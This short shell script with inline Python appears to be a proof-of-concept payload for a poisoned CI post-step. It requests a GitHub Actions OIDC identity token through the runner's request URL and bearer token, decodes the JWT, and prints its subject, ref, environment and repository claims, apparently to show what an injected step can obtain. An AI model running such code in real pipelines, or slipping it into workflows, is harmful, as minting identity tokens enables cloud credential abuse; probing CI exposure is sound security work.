echo POISONED_POST_RAN
python3 - <<'PY'
import os, json, base64, urllib.request
req = urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=probe-audience",
                             headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
tok = json.load(urllib.request.urlopen(req))["value"]
payload = tok.split(".")[1]
claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
for k in ["sub", "ref", "environment", "job_workflow_ref", "workflow_ref", "repository"]:
    print("OIDC_" + k.upper() + "=" + str(claims.get(k)))
PY
